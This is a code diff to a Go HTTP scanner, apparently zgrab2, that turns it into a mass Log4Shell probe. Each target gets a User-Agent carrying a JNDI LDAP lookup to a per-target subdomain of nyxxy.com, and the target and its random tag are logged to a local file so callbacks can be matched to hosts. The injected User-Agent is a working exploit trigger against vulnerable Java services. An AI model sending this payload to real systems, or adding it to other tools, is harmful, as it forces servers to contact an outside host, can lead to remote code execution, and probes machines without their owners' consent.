@@ -10,17 +10,21 @@ import (
 	"bytes"
 	"context"
 	"crypto/sha1"
+	"crypto/md5"
 	"crypto/sha256"
 	"encoding/csv"
 	"encoding/hex"
 	"errors"
 	"fmt"
+	"os"
 	"io"
+	"math/rand"
 	"net"
 	"net/url"
 	"strconv"
 	"strings"
 	"time"
+
 
 	log "github.com/sirupsen/logrus"
 	"github.com/zmap/zcrypto/tls"
@@ -422,6 +426,11 @@ var protoToPort = map[string]uint16{
 	"https": 443,
 }
 
+func GetMD5Hash(text string) string {
+   hash := md5.Sum([]byte(text))
+   return hex.EncodeToString(hash[:])
+}
+
 // getHTTPURL gets the HTTP URL (sans default port) for the given protocol/host/port/endpoint.
 func getHTTPURL(https bool, host string, port uint16, endpoint string) string {
 	var proto string
@@ -434,6 +443,20 @@ func getHTTPURL(https bool, host string, port uint16, endpoint string) string {
 		return proto + "://" + host + endpoint
 	}
 	return proto + "://" + net.JoinHostPort(host, strconv.FormatUint(uint64(port), 10)) + endpoint
+}
+
+
+func appendToFile(filename string, text string) {
+	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+	    panic(err)
+	}
+
+	defer f.Close()
+
+	if _, err = f.WriteString(text); err != nil {
+	    panic(err)
+	}
 }
 
 // NewHTTPScan gets a new Scan instance for the given target
@@ -468,10 +491,36 @@ func (scanner *Scanner) newHTTPScan(t *zgrab2.ScanTarget, useHTTPS bool) *scan {
 	} else {
 		port = uint16(scanner.config.BaseFlags.Port)
 	}
+
+	randVal := RandomString(10)
+
+
+    hashInString := fmt.Sprintf("%s : %s:%d %s\n", randVal, host, port, scanner.config.Endpoint)
+	appendToFile("runlog.req", hashInString)
+
+	ret.client.UserAgent = fmt.Sprintf("$%%7Bjndi:ldap://%s.nyxxy.com%%7D", randVal)
+
+
+	// fmt.Printf("%s (%s)\n", host, randVal)
+
 	ret.url = getHTTPURL(useHTTPS, host, port, scanner.config.Endpoint)
 
 	return &ret
 }
+
+func RandomString(n int) string {
+    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+ 
+	rSource := rand.NewSource(time.Now().UnixNano())
+    rGen := rand.New(rSource)
+
+    s := make([]rune, n)
+    for i := range s {
+        s[i] = letters[rGen.Intn(len(letters))]
+    }
+    return string(s)
+}
+
 
 // Grab performs the HTTP scan -- implementation taken from zgrab/zlib/grabber.go
 func (scan *scan) Grab() *zgrab2.ScanError {
